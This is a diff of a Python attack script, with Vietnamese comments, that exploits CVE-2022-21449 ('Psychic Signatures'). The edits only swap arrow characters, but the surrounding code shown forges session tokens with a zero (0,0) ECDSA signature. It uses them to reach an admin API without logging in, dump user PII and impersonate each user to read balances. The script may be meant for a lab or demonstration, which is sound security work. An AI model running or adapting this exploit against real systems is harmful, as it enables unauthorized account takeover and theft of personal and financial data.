@@ -1,7 +1,7 @@
 """TẤN CÔNG 2 — PSYCHIC SIGNATURES / CVE-2022-21449 (qua HTTP, API công khai thật).
 
 Chế tạo token phiên với chữ ký RỖNG (r=0, s=0). Server bỏ kiểm tra r,s ∈ [1,n-1]
-nên chấp nhận → mạo danh tài khoản BẤT KỲ mà không cần mật khẩu: chiếm quyền admin
+nên chấp nhận -> mạo danh tài khoản BẤT KỲ mà không cần mật khẩu: chiếm quyền admin
 để lộ toàn bộ hồ sơ PII, và giả mạo phiên đăng nhập của người dùng khác.
 
     python attack_psychic.py
@@ -28,10 +28,10 @@ def main():
     print("=== Tấn công 2: PSYCHIC SIGNATURES (chữ ký (0,0)) ===")
 
     st, _ = get("/api/admin/users")
-    print(f"Truy cập /api/admin/users khi chưa đăng nhập → HTTP {st} (bị từ chối).")
+    print(f"Truy cập /api/admin/users khi chưa đăng nhập -> HTTP {st} (bị từ chối).")
 
     st, res = get("/api/admin/users", cookie=f"session_token={forge_token('admin', 'admin')}")
-    print(f"Gửi lại kèm token chữ ký (0,0) → HTTP {st}.")
+    print(f"Gửi lại kèm token chữ ký (0,0) -> HTTP {st}.")
     if st != 200 or not isinstance(res, dict):
         print("Không vượt qua được xác thực.")
         return
@@ -58,7 +58,7 @@ def main():
         _, acc = get("/api/account", cookie=f"session_token={token}")
         who = acc.get("user") if isinstance(acc, dict) else None
         bal = acc.get("balance", 0) if isinstance(acc, dict) else 0
-        print(f"  {u} ({role}) → đăng nhập với tư cách '{who}', số dư {money(bal)} CBC"
+        print(f"  {u} ({role}) -> đăng nhập với tư cách '{who}', số dư {money(bal)} CBC"
               f"{' ✓' if who == u else ' (thất bại)'}")
         print(f"    {token}")
 
